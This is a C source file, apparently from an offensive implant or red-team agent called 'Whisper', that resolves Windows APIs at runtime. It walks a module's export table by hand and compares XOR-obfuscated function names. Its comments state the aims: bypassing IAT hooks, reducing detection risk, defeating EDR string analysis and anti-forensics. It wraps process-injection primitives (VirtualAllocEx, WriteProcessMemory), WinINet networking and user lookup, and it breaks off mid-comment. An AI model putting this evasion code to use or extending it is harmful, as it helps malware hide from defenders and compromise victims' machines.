#include "whisper_winapi.h"
#include "whisper_config.h"
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <wininet.h>

// futureu notes:

// could move to:
//  Generic API Resolver Wrapper
// #def ine  RESOLVE_API_WRAPPER(module, funcType, funcName) \
//    funcType p##funcName = (funcType)ResolveFunction(module, #funcName); \
//    if (!p##funcName) { \
//        printf("[!] Failed to resolve %s\n", #funcName); \
//        return FALSE; \
//    }
//
// #def ine CLEAR_API_WRAPPER(funcName) \
//    SecureZeroMemory(&p##funcName, sizeof(p##funcName));

// =====================================
// TypeDefs ----------------------------
// =====================================
// Types for functions that need them. Not super useful, defined in windows.h, are useful for if I ever want to get rid of windows.h
// typedef const wchar_t* LPCWSTR;
// typedef unsigned long DWORD;
// typedef unsigned char BYTE, * LPBYTE;
// typedef DWORD* LPDWORD;
// typedef DWORD* PDWORD;
// typedef int BOOL;  // Windows BOOL type (typically 4 bytes)

// #ifndef TRUE
// #define TRUE 1
// #endif
//
// #ifndef FALSE
// #define FALSE 0
// #endif

// UNICODE_STRING structure (Windows format)
// typedef struct _UNICODE_STRING {
//    USHORT Length;
//    USHORT MaximumLength;
//    PWSTR Buffer;
//} UNICODE_STRING, * PUNICODE_STRING;

// TypeDefs for functions, needed for the dynamic func lookups

typedef BOOL(WINAPI* CreateProcessA_t)(
    LPCSTR lpApplicationName,
    LPSTR lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL bInheritHandles,
    DWORD dwCreationFlags,
    LPVOID lpEnvironment,
    LPCSTR lpCurrentDirectory,
    LPSTARTUPINFOA lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation);

typedef LPVOID(WINAPI* VirtualAllocEx_t)(
    HANDLE hProcess,
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD flAllocationType,
    DWORD flProtect);

typedef BOOL(WINAPI* WriteProcessMemory_t)(
    HANDLE hProcess,
    LPVOID lpBaseAddress,
    LPCVOID lpBuffer,
    SIZE_T nSize,
    SIZE_T* lpNumberOfBytesWritten);

typedef DWORD(WINAPI* QueueUserAPC_t)(
    PAPCFUNC pfnAPC,
    HANDLE hThread,
    ULONG_PTR dwData);

typedef DWORD(WINAPI* ResumeThread_t)(
    HANDLE hThread);

typedef HMODULE(WINAPI* LoadLibraryW_t)(LPCWSTR);

#ifndef NET_API_FUNCTION
#define NET_API_FUNCTION __stdcall
#endif
typedef unsigned long NET_API_STATUS;

typedef NET_API_STATUS(NET_API_FUNCTION* NetUserEnum_t)(
    LPCWSTR servername,
    DWORD level,
    DWORD filter,
    LPBYTE* bufptr,
    DWORD prefmaxlen,
    LPDWORD entriesread,
    LPDWORD totalentries,
    PDWORD resume_handle);

typedef NET_API_STATUS(WINAPI* NetApiBufferFree_t)(LPVOID);
typedef BOOL(WINAPI* GetUserNameW_t)(LPWSTR, LPDWORD);
typedef void(WINAPI* Sleep_t)(DWORD);
typedef BOOL(WINAPI* CreatePipe_t)(PHANDLE, PHANDLE, LPSECURITY_ATTRIBUTES, DWORD);
typedef BOOL(WINAPI* SetHandleInformation_t)(HANDLE, DWORD, DWORD);
typedef BOOL(WINAPI* CloseHandle_t)(HANDLE);
typedef DWORD(WINAPI* WaitForSingleObject_t)(HANDLE, DWORD);
typedef BOOL(WINAPI* ReadFile_t)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);

typedef HANDLE(WINAPI* CreateThread_t)(
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    SIZE_T dwStackSize,
    LPTHREAD_START_ROUTINE lpStartAddress,
    LPVOID lpParameter,
    DWORD dwCreationFlags,
    LPDWORD lpThreadId);

typedef HINTERNET(WINAPI* InternetOpenA_t)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD);
typedef HINTERNET(WINAPI* InternetOpenW_t)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
typedef HINTERNET(WINAPI* InternetOpenUrlW_t)(HINTERNET, LPCWSTR, LPCWSTR, DWORD, DWORD, DWORD_PTR);
typedef BOOL(WINAPI* InternetReadFile_t)(HINTERNET, LPVOID, DWORD, LPDWORD);
typedef BOOL(WINAPI* InternetCloseHandle_t)(HINTERNET);
typedef BOOL(WINAPI* HttpSendRequestA_t)(HINTERNET, LPCSTR, DWORD, LPVOID, DWORD);
typedef HINTERNET(WINAPI* InternetConnectA_t)(HINTERNET, LPCSTR, INTERNET_PORT, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR);
typedef HINTERNET(WINAPI* HttpOpenRequestA_t)(HINTERNET, LPCSTR, LPCSTR, LPCSTR, LPCSTR, LPCSTR*, DWORD, DWORD_PTR);
typedef int (WINAPI *MessageBoxA_t)(HWND, LPCSTR, LPCSTR, UINT);

// -------------------------------------
// Useful Notes ------------------------
// -------------------------------------

/*
 * Default DLLs Loaded in a Windows Process
 * -----------------------------------------
 * Windows automatically loads certain DLLs when a process starts.
 * The exact list may vary depending on Windows version, system configuration,
 * and whether the application is console, GUI, or network-enabled.
 *
 * TLDR: If they are in this list, they *should* be able to be PEB walked/resolved
 *
 * Core Windows NT DLLs:
 * ----------------------
 * - ntdll.dll       -> Provides NT system calls, syscall stubs, and internal APIs.
 * - kernel32.dll    -> Core Windows API functions (memory management, file I/O, threading).
 * - KernelBase.dll  -> Modern implementations of kernel32 functions (introduced in Win7+).
 *
 * User Interface & Graphics:
 * --------------------------
 * - user32.dll      -> Windows GUI API (message handling, windows, dialogs).
 * - gdi32.dll       -> Graphics Device Interface (GDI) for rendering graphics.
 * - gdi32full.dll   -> Extended GDI functionality (modern versions of Windows).
 * - comctl32.dll    -> Common Controls (buttons, lists, progress bars, etc.).
 *
 * System Services & Security:
 * ---------------------------
 * - advapi32.dll    -> Security, registry, service control APIs.
 * - sechost.dll     -> Service Control Manager and security helpers.
 * - rpcrt4.dll      -> Remote Procedure Call (RPC) framework.
 * - crypt32.dll     -> Cryptography APIs (certificate management, encryption).
 *
 * C Runtime & Utility Libraries:
 * ------------------------------
 * - msvcrt.dll      -> Microsoft C Runtime (standard C functions: DEBUG_LOG, malloc, etc.).
 * - ucrtbase.dll    -> Universal CRT (modern alternative to msvcrt.dll).
 * - vcruntime140.dll (or similar) -> Visual C++ runtime (depends on app compilation).
 * - shlwapi.dll     -> Shell utilities (string manipulation, file path handling).
 *
 * Networking & Winsock:
 * ---------------------
 * - ws2_32.dll      -> Winsock API for network communication (sockets, TCP/IP).
 * - dnsapi.dll      -> DNS resolution APIs (domain name lookups).
 *
 * COM & Object Handling:
 * ----------------------
 * - ole32.dll       -> Object Linking and Embedding (OLE) support.
 * - oleaut32.dll    -> Automation support for COM objects.
 * - combase.dll     -> Modern COM base functionality (Windows 8+).
 * - shell32.dll     -> Windows shell APIs (file operations, system dialogs).
 *
 * Threading & Synchronization:
 * ----------------------------
 * - ntdll.dll       -> (Also listed under core) but contains thread management.
 * - kernel32.dll    -> (Also listed under core) thread, synchronization primitives.
 *
 * Debugging & Profiling:
 * ----------------------
 * - dbghelp.dll     -> Debugging and symbol handling APIs.
 * - psapi.dll       -> Process status API (retrieves information about processes).
 *
 * Multimedia & Audio (If Needed):
 * -------------------------------
 * - winmm.dll       -> Windows Multimedia API (audio playback, timers).
 * - avrt.dll        -> Audio/Video real-time processing.
 * - dsound.dll      -> DirectSound (optional, loaded if used).
 *
 * Miscellaneous:
 * --------------
 * - version.dll     -> Retrieves version information for files.
 * - iphlpapi.dll    -> IP Helper APIs (network configuration).
 * - bcrypt.dll      -> Modern cryptography API (hashing, encryption).
 * - profapi.dll     -> User profile management.
 *
 * Notes:
 * -------
 * - The actual list may vary based on the environment, OS version, and application type.
 * - GUI applications may load additional libraries like comctl32.dll.
 * - Additional dependencies may be loaded dynamically when needed.
 */

/*
=============================================================
 Windows command_result_data Types and Their C Standard Equivalents
=============================================================

Basic Integer Types:
--------------------
  BYTE        ->  unsigned char          (8-bit)
  WORD        ->  unsigned short         (16-bit)
  DWORD       ->  unsigned long          (32-bit)
  QWORD       ->  unsigned long long     (64-bit) (Windows-specific)
  INT         ->  int                    (Same as standard C int)
  UINT        ->  unsigned int           (Same as standard C unsigned int)
  LONG        ->  long                   (At least 32-bit, can be 64-bit on some systems)
  ULONG       ->  unsigned long          (At least 32-bit)
  LONGLONG    ->  long long              (64-bit)
  ULONGLONG   ->  unsigned long long     (64-bit)

Pointer-Sized Types:
--------------------
  INT_PTR     ->  intptr_t                (Signed integer same size as pointer)
  UINT_PTR    ->  uintptr_t               (Unsigned integer same size as pointer)
  LONG_PTR    ->  long long (64-bit)      (Signed pointer-sized integer)
  ULONG_PTR   ->  unsigned long long      (Unsigned pointer-sized integer)

Character & String Types:
-------------------------
  CHAR        ->  char                    (8-bit ASCII character)
  WCHAR       ->  wchar_t                 (16-bit wide character, used for Unicode)
  TCHAR       ->  char / wchar_t          (Depends on UNICODE definition)
  LPSTR       ->  char*                   (Pointer to an ANSI string)
  LPWSTR      ->  wchar_t*                (Pointer to a Unicode string)
  LPTSTR      ->  char* / wchar_t*        (Depends on UNICODE definition)
  LPCSTR      ->  const char*             (Pointer to a read-only ANSI string)
  LPCWSTR     ->  const wchar_t*          (Pointer to a read-only Unicode string)
  LPCTSTR     ->  const char* / const wchar_t*  (Depends on UNICODE)

Boolean Types:
--------------
  BOOL        ->  int                     (0 = FALSE, nonzero = TRUE)
  BOOLEAN     ->  unsigned char           (Used in drivers, 0 = FALSE, 1 = TRUE)
  TRUE        ->  1
  FALSE       ->  0

Handle Types:
-------------
  HANDLE      ->  void*                   (Generic handle to an object)
  HMODULE     ->  void*                   (Handle to a module)
  HINSTANCE   ->  void*                   (Handle to an application instance)
  HWND        ->  void*                   (Handle to a window)
  HDC         ->  void*                   (Handle to a device context)
  SOCKET      ->  int                     (Socket handle)

Time-Related Types:
-------------------
  FILETIME    ->  struct with 64-bit timestamp (100-nanosecond intervals since 1601)
  SYSTEMTIME  ->  struct with individual date/time fields
  LARGE_INTEGER -> union with 64-bit integer for high-precision timing

Special Types:
--------------
  LPVOID      ->  void*                   (Generic pointer to anything)
  PVOID       ->  void*                   (Same as LPVOID)
  FARPROC     ->  void(*)()               (Pointer to a function)
  CALLBACK    ->  __stdcall               (Calling convention for callbacks)

=============================================================
 Notes:
 - Use `WCHAR` and `LPWSTR` for Unicode strings.
 - `DWORD` is widely used in Windows APIs for unsigned 32-bit values.
 - `HANDLE` is often just a `void*`, but should be treated as an opaque type.
 - `BOOL` is an **int**, not a `bool` (C99 `stdbool.h` is not used in Windows APIs).
=============================================================
*/

// -------------------------------------
// Functions ---------------------------
// -------------------------------------

// --------------------------------------------
// Dynamic Function Resolution
// Useful For:
//    - bypassing IAT Hooks
// --------------------------------------------

// moved to LoadLibraryA instead of GetModuleHandle as GetModleHandle is only for when the lib is already loaded
/*

GetModuleHandle:
    https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea

    Retrieves a module handle for the specified module. The module must have been loaded by the calling process.

    TLDR: Only works if module already loaded

Load LibraryA:
    https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya

    Loads the specified module into the address space of the calling process. The specified module may cause other modules to be loaded.

    TLDR: Will load module for us.

    Downsides: LoadLibrary Reads from disk, and loads dll into memory.


Static pointer caching:
- We are using static pointers to functions for efficeny/less calls to ResolveFunction.


This is declred above each function:
static CreateProcessA_t pCreateProcessA = NULL;

If the function cannot be found, each func can look it up:

   if (!pCreateProcessA) {
       pCreateProcessA = (CreateProcessA_t)ResolveFunction(L"kernel32.dll", "CreateProcessA");
       if (!pCreateProcessA) return 1;
   }

*/

// --------------------------------------------
// WhisperApi Funcs ---------------------------
// --------------------------------------------

void XorText(char *text, char key) {
    size_t len = strlen(text);
    for (size_t i = 0; i < len; i++) {
        text[i] = text[i] ^ key;  // XOR each character with key (not doing index)
    }
}


FARPROC ResolveFunction(const wchar_t* module_name, const char* function_name)
{
    DEBUG_LOG("[+] Attempting to resolve function: %s\n", function_name);

    HMODULE hModule = GetModuleHandleW(module_name);
    if (!hModule) {
        DEBUG_LOG("[!] GetModuleHandleW failed, trying LoadLibraryW.\n");
        hModule = LoadLibraryW(module_name);
    }

    if (!hModule) {
        DEBUG_LOGW(L"[!] Failed to get a valid module handle for %ls.\n", module_name);
        return NULL;
    }

    DEBUG_LOGW(L"[+] Successful handle to %ls \n", module_name);

    // Attempt function resolution
    FARPROC pFunc = GetProcAddressReplacement(hModule, function_name);
    if (!pFunc) {
        DEBUG_LOG("[-] GetProcAddressReplacement failed for %s. Error=%lu.\n", function_name, GetLastError());
        return NULL;
    }

    return pFunc;
}


FARPROC GetProcAddressReplacement(IN HMODULE hModule, IN LPCSTR lpFuncNameXor) {
    /*
        (Modified) Drop-in replacement for GetProcAddress, adapted from MalDev.

        ## Purpose:
        This function takes a handle to a DLL (`hModule`) and an **XOR-obfuscated** function name (`lpFuncNameXor`).
        It iterates through the module's exported functions, **XORs each function name**, and compares it 
        to `lpFuncNameXor`. If a match is found, it returns the function's address.

        ## Why XOR the function name?
        Normally, calling `ResolveFunction("kernel32.dll", "MessageBoxA")` leaves function names 
        as **plaintext in the binary**, making them visible in tools like `strings` or static analysis.
        By XOR-ing function names, we **obfuscate them**, keeping them out of memory and the binary, 
        making direct function name detection harder.

        Example:
            key = 0x10
            MessageBoxA =[XOR]=> `]uccqwuRhQ` 
                HEX: `0x5d,0x75,0x63,0x63,0x71,0x77,0x75,0x52,0x7f,0x68,0x51`

            (assuming we are also searching for MessageBoxA)
            CHAR* pFunctionName =[XOR]=> `]uccqwuRhQ`

            `]uccqwuRhQ` == `]uccqwuRhQ`, so return address of this function.


        ## Parameters:
        - `hModule` (HMODULE): Handle to the loaded DLL containing the target function.
        - `lpFuncNameXor` (LPCSTR): The **XOR-encrypted function name** to search for.

        ## Returns:
        - The function's address (`FARPROC`) if found.
        - `NULL` if the function is not found.

        ## Notes:
        - This does **not** decrypt function names, it simply **compares XOR’d names** to avoid plaintext function names.
        - Running `strings` on the binary will no longer reveal function names like `"MessageBoxA"`.

    */
	// We do this to avoid casting at each time we use 'hModule'
	PBYTE pBase = (PBYTE)hModule;
	
	// Getting the dos header and doing a signature check
	PIMAGE_DOS_HEADER	pImgDosHdr		= (PIMAGE_DOS_HEADER)pBase;
	if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE) 
		return NULL;
	
	// Getting the nt headers and doing a signature check
	PIMAGE_NT_HEADERS	pImgNtHdrs		= (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE) 
		return NULL;

	// Getting the optional header
	IMAGE_OPTIONAL_HEADER	ImgOptHdr	= pImgNtHdrs->OptionalHeader;

	// Getting the image export table
	PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY) (pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	// Getting the function's names array pointer
	PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);
	
	// Getting the function's addresses array pointer
	PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);
	
	// Getting the function's ordinal array pointer
	PWORD  FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);

	// Looping through all the exported functions
	for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++){
		
		// Getting the name of the function (read only)
        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);

		// Getting the address of the function through its ordinal
		PVOID pFunctionAddress	= (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);

        //setup func name to be XOR'd
        size_t pFunctionName_Length = strlen(pFunctionName);
        BYTE* pFunctionNameXor = (BYTE*)malloc(pFunctionName_Length + 1); // +1 for \0 safety
        if (!pFunctionNameXor) return NULL;
        memcpy(pFunctionNameXor, pFunctionName, pFunctionName_Length);

        // Copy original name before XOR-ing
        memcpy(pFunctionNameXor, pFunctionName, pFunctionName_Length + 1);

        // DEBUG_LOG("Original function name: %s\n", pFunctionName);
        // DEBUG_LOG("Function name XOR key: 0x%X\n", FUNC_ENCRYPTED_NAME_KEY);

        //XOR pFuncName, to use for comparison below
        for (size_t j = 0; j < pFunctionName_Length; j++) {
            pFunctionNameXor[j] ^= FUNC_ENCRYPTED_NAME_KEY;
        }

        // DEBUG_LOG("XOR'd function name: %s\n", pFunctionNameXor);

        //compare lpFuncName, and pFunctionNameXor, which are now both XOR'd.
        if (memcmp(lpFuncNameXor, pFunctionNameXor, pFunctionName_Length) == 0) {
			DEBUG_LOG("[ %0.4d ] FOUND API -\t NAME: %s -\t ADDRESS: 0x%p  -\t ORDINAL: %d\n", i, pFunctionName, pFunctionAddress, FunctionOrdinalArray[i]);
	        //call a secure free (instead of regular free) to 0 out the memory where the XOR func name was stored, just in case
            //an EDR gets smart and tries to brute force the XOR value
            //SecureFree(pFunctionNameXor, strlen(pFunctionNameXor));
            //SecureFree(pFunctionNameXor, pFunctionName_Length);

            return pFunctionAddress;
		}
        
        //free no matter what
        //maybe move to secure free? Prolly not a big deal, it's still XOR'd
        free(pFunctionNameXor);

	}

	return NULL;
}

// --------------------------------------------
// WhisperApi Funcs ---------------------------
// --------------------------------------------

// Using static ensures we only resolve once, improving OPSEC and performance
// it prevents repeated resolution calls, reducing detection risk

// =====================================
//  PROCESS & THREAD MANAGEMENT
// =====================================

static CreateProcessA_t pCreateProcessA = NULL;
BOOL WhisperCreateProcessA(
    LPCSTR lpApplicationName,
    LPSTR lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL bInheritHandles,
    DWORD dwCreationFlags,
    LPVOID lpEnvironment,
    LPCSTR lpCurrentDirectory,
    LPSTARTUPINFOA lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation)
{
    DEBUG_LOG("[FUNC_CALL] WhisperCreateProcessA\n");

    if (!pCreateProcessA) {
        pCreateProcessA = (CreateProcessA_t)ResolveFunction(L"kernel32.dll", "CreateProcessA");
        if (!pCreateProcessA)
            return FALSE;
    }

    return pCreateProcessA(lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes,
        bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory,
        lpStartupInfo, lpProcessInformation);
}

static CreateThread_t pCreateThread = NULL;
HANDLE WhisperCreateThread(
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    SIZE_T dwStackSize,
    LPTHREAD_START_ROUTINE lpStartAddress,
    LPVOID lpParameter,
    DWORD dwCreationFlags,
    LPDWORD lpThreadId)
{
    DEBUG_LOG("[FUNC_CALL] WhisperCreateThread\n");

    if (!pCreateThread) {
        pCreateThread = (CreateThread_t)ResolveFunction(L"kernel32.dll", FUNC_CreateThread_ENCRYPTED_NAME);
        if (!pCreateThread)
            return NULL;
    }

    return pCreateThread(lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId);
}


static ResumeThread_t pResumeThread = NULL;
DWORD WhisperResumeThread(HANDLE hThread)
{
    DEBUG_LOG("[FUNC_CALL] WhisperResumeThread\n");
    if (!pResumeThread) {
        pResumeThread = (ResumeThread_t)ResolveFunction(L"kernel32.dll", FUNC_ResumeThread_ENCRYPTED_NAME);
        if (!pResumeThread)
            return -1;
    }

    return pResumeThread(hThread);
}

// =====================================
//  MEMORY MANAGEMENT
// =====================================

static VirtualAllocEx_t pVirtualAllocEx = NULL;
LPVOID WhisperVirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)
{
    DEBUG_LOG("[FUNC_CALL] WhisperVirtualAllocEx\n");

    if (!pVirtualAllocEx) {
        pVirtualAllocEx = (VirtualAllocEx_t)ResolveFunction(L"kernel32.dll", FUNC_VirtualAllocEx_ENCRYPTED_NAME);
        if (!pVirtualAllocEx)
            return NULL;
    }

    return pVirtualAllocEx(hProcess, lpAddress, dwSize, flAllocationType, flProtect);
}

static WriteProcessMemory_t pWriteProcessMemory = NULL;
BOOL WhisperWriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten)
{
    DEBUG_LOG("[FUNC_CALL] WhisperWriteProcessMemory\n");
    if (!pWriteProcessMemory) {
        pWriteProcessMemory = (WriteProcessMemory_t)ResolveFunction(L"kernel32.dll", FUNC_WriteProcessMemory_ENCRYPTED_NAME);
        if (!pWriteProcessMemory)
            return FALSE;
    }

    return pWriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten);
}

// =====================================
//  PIPE & HANDLE MANAGEMENT
// =====================================

static CreatePipe_t pCreatePipe = NULL;
BOOL WhisperCreatePipe(PHANDLE hReadPipe, PHANDLE hWritePipe, LPSECURITY_ATTRIBUTES lpPipeAttributes, DWORD nSize)
{
    DEBUG_LOG("[FUNC_CALL] WhisperCreatePipe\n");
    if (!pCreatePipe) {
        pCreatePipe = (CreatePipe_t)ResolveFunction(L"kernel32.dll", FUNC_CreatePipe_ENCRYPTED_NAME);
        if (!pCreatePipe)
            return FALSE;
    }

    return pCreatePipe(hReadPipe, hWritePipe, lpPipeAttributes, nSize);
}

static SetHandleInformation_t pSetHandleInformation = NULL;
BOOL WhisperSetHandleInformation(HANDLE hObject, DWORD dwMask, DWORD dwFlags)
{
    DEBUG_LOG("[FUNC_CALL] WhisperSetHandleInformation\n");
    if (!pSetHandleInformation) {
        pSetHandleInformation = (SetHandleInformation_t)ResolveFunction(L"kernel32.dll", FUNC_SetHandleInformation_ENCRYPTED_NAME);
        if (!pSetHandleInformation)
            return FALSE;
    }

    return pSetHandleInformation(hObject, dwMask, dwFlags);
}

static CloseHandle_t pCloseHandle = NULL;
BOOL WhisperCloseHandle(HANDLE hObject)
{
    DEBUG_LOG("[FUNC_CALL] WhisperCloseHandle\n");

    if (!pCloseHandle) {
        pCloseHandle = (CloseHandle_t)ResolveFunction(L"kernel32.dll", FUNC_CloseHandle_ENCRYPTED_NAME);
        if (!pCloseHandle)
            return FALSE;
    }

    return pCloseHandle(hObject);
}

// =====================================
//  NETWORKING - WININET
// =====================================

static InternetOpenA_t pInternetOpenA = NULL;
HINTERNET WhisperInternetOpenA(LPCSTR lpszAgent, DWORD dwAccessType, LPCSTR lpszProxy, LPCSTR lpszProxyBypass, DWORD dwFlags)
{
    DEBUG_LOG("[FUNC_CALL] WhisperInternetOpenA\n");

    if (!pInternetOpenA) {
        pInternetOpenA = (InternetOpenA_t)ResolveFunction(L"wininet.dll", FUNC_InternetOpenA_ENCRYPTED_NAME);
        if (!pInternetOpenA)
            return NULL;
    }

    return pInternetOpenA(lpszAgent, dwAccessType, lpszProxy, lpszProxyBypass, dwFlags);
}

static InternetConnectA_t pInternetConnectA = NULL;
HINTERNET WhisperInternetConnectA(
    HINTERNET hInternet,
    LPCSTR lpszServerName,
    INTERNET_PORT nServerPort,
    LPCSTR lpszUserName,
    LPCSTR lpszPassword,
    DWORD dwService,
    DWORD dwFlags,
    DWORD_PTR dwContext)
{
    DEBUG_LOG("[FUNC_CALL] WhisperInternetConnectA\n");

    if (!pInternetConnectA) {
        pInternetConnectA = (InternetConnectA_t)ResolveFunction(L"wininet.dll", FUNC_InternetConnectA_ENCRYPTED_NAME);
        if (!pInternetConnectA)
            return NULL;
    }

    return pInternetConnectA(hInternet, lpszServerName, nServerPort, lpszUserName, lpszPassword, dwService, dwFlags, dwContext);
}

static HttpOpenRequestA_t pHttpOpenRequestA = NULL;
HINTERNET WhisperHttpOpenRequestA(
    HINTERNET hConnect,
    LPCSTR lpszVerb,
    LPCSTR lpszObjectName,
    LPCSTR lpszVersion,
    LPCSTR lpszReferrer,
    LPCSTR* lplpszAcceptTypes,
    DWORD dwFlags,
    DWORD_PTR dwContext)
{
    DEBUG_LOG("[FUNC_CALL] WhisperHttpOpenRequestA\n");

    if (!pHttpOpenRequestA) {
        pHttpOpenRequestA = (HttpOpenRequestA_t)ResolveFunction(L"wininet.dll", FUNC_HttpOpenRequestA_ENCRYPTED_NAME);
        if (!pHttpOpenRequestA)
            return NULL;
    }

    return pHttpOpenRequestA(hConnect, lpszVerb, lpszObjectName, lpszVersion, lpszReferrer, lplpszAcceptTypes, dwFlags, dwContext);
}

static HttpSendRequestA_t pHttpSendRequestA = NULL;
BOOL WhisperHttpSendRequestA(HINTERNET hRequest, LPCSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength)
{
    DEBUG_LOG("[FUNC_CALL] WhisperHttpSendRequestA\n");
    if (!pHttpSendRequestA) {
        pHttpSendRequestA = (HttpSendRequestA_t)ResolveFunction(L"wininet.dll", FUNC_HttpSendRequestA_ENCRYPTED_NAME);
        if (!pHttpSendRequestA)
            return FALSE;
    }

    return pHttpSendRequestA(hRequest, lpszHeaders, dwHeadersLength, lpOptional, dwOptionalLength);
}

static InternetOpenUrlW_t pInternetOpenUrlW = NULL;
HINTERNET WhisperInternetOpenUrlW(HINTERNET hInternet, LPCWSTR lpszUrl, LPCWSTR lpszHeaders, DWORD dwHeadersLength, DWORD dwFlags, DWORD_PTR dwContext)
{
    DEBUG_LOG("[FUNC_CALL] WhisperInternetOpenUrlW\n");

    if (!pInternetOpenUrlW) {
        pInternetOpenUrlW = (InternetOpenUrlW_t)ResolveFunction(L"wininet.dll", FUNC_InternetOpenUrlW_ENCRYPTED_NAME);
        if (!pInternetOpenUrlW)
            return NULL;
    }

    return pInternetOpenUrlW(hInternet, lpszUrl, lpszHeaders, dwHeadersLength, dwFlags, dwContext);
}

static InternetReadFile_t pInternetReadFile = NULL;
BOOL WhisperInternetReadFile(HINTERNET hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead)
{
    DEBUG_LOG("[FUNC_CALL] WhisperInternetReadFile\n");

    if (!pInternetReadFile) {
        pInternetReadFile = (InternetReadFile_t)ResolveFunction(L"wininet.dll", FUNC_InternetReadFile_ENCRYPTED_NAME);
        if (!pInternetReadFile)
            return FALSE;
    }

    return pInternetReadFile(hFile, lpBuffer, dwNumberOfBytesToRead, lpdwNumberOfBytesRead);
}

static InternetCloseHandle_t pInternetCloseHandle = NULL;
BOOL WhisperInternetCloseHandle(HINTERNET hInternet)
{
    DEBUG_LOG("[FUNC_CALL]WhisperInternetCloseHandle\n");
    if (!pInternetCloseHandle) {
        pInternetCloseHandle = (InternetCloseHandle_t)ResolveFunction(L"wininet.dll", FUNC_InternetCloseHandle_ENCRYPTED_NAME);
        if (!pInternetCloseHandle)
            return FALSE;
    }

    return pInternetCloseHandle(hInternet);
}

// =====================================
//  USER & SYSTEM INFORMATION
// =====================================

static GetUserNameW_t pGetUserNameW = NULL;
BOOL WhisperGetUserNameW(LPWSTR lpBuffer, LPDWORD pcbBuffer)
{
    DEBUG_LOG("[FUNC_CALL] WhisperGetUserNameW\n");

    if (!pGetUserNameW) {
        pGetUserNameW = (GetUserNameW_t)ResolveFunction(L"Advapi32.dll", FUNC_GetUserNameW_ENCRYPTED_NAME);
        if (!pGetUserNameW)
            return FALSE;
    }

    return pGetUserNameW(lpBuffer, pcbBuffer);
}

// =====================================
//  TIMING FUNCTIONS
// =====================================

static Sleep_t pSleep = NULL;

void WhisperSleep(DWORD dwMilliseconds)
{
    DEBUG_LOG("[FUNC_CALL] WhisperSleep\n");

    if (!pSleep) {
        pSleep = (Sleep_t)ResolveFunction(L"kernel32.dll", FUNC_Sleep_ENCRYPTED_NAME);
        if (!pSleep)
            return;
    }

    pSleep(dwMilliseconds);
}


// =====================================
//  SYNCHRONIZATION FUNCTIONS
// =====================================

static WaitForSingleObject_t pWaitForSingleObject = NULL;
DWORD WhisperWaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds)
{
    DEBUG_LOG("[FUNC_CALL] WhisperWaitForSingleObject\n");

    if (!pWaitForSingleObject) {
        pWaitForSingleObject = (WaitForSingleObject_t)ResolveFunction(L"kernel32.dll", FUNC_WaitForSingleObject_ENCRYPTED_NAME);
        if (!pWaitForSingleObject)
            return WAIT_FAILED;
    }

    return pWaitForSingleObject(hHandle, dwMilliseconds);
}

// =====================================
//  FILE MANAGEMENT
// =====================================

static ReadFile_t pReadFile = NULL;
BOOL WhisperReadFile(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped)
{
    DEBUG_LOG("[FUNC_CALL] WhisperReadFile\n");
    if (!pReadFile) {
        pReadFile = (ReadFile_t)ResolveFunction(L"kernel32.dll", FUNC_ReadFile_ENCRYPTED_NAME);
        if (!pReadFile)
            return FALSE;
    }

    return pReadFile(hFile, lpBuffer, nNumberOfBytesToRead, lpNumberOfBytesRead, lpOverlapped);
}

// Misc

static MessageBoxA_t pMessageBoxA = NULL;

int WhisperMessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)
{
    DEBUG_LOG("[FUNC_CALL] WhisperMessageBoxA\n");

    if (!pMessageBoxA) {
            pMessageBoxA = (MessageBoxA_t)ResolveFunction(L"user32.dll", FUNC_MessageBoxA_ENCRYPTED_NAME);
            if (!pMessageBoxA) {
                return FALSE;
            }
    }


    return pMessageBoxA(hWnd, lpText, lpCaption, uType);
}

// =====================================
//  Memory Saftey + anti foresnics
// =====================================

// safe free
void SecureFree(void* ptr, size_t size)
{
    /*

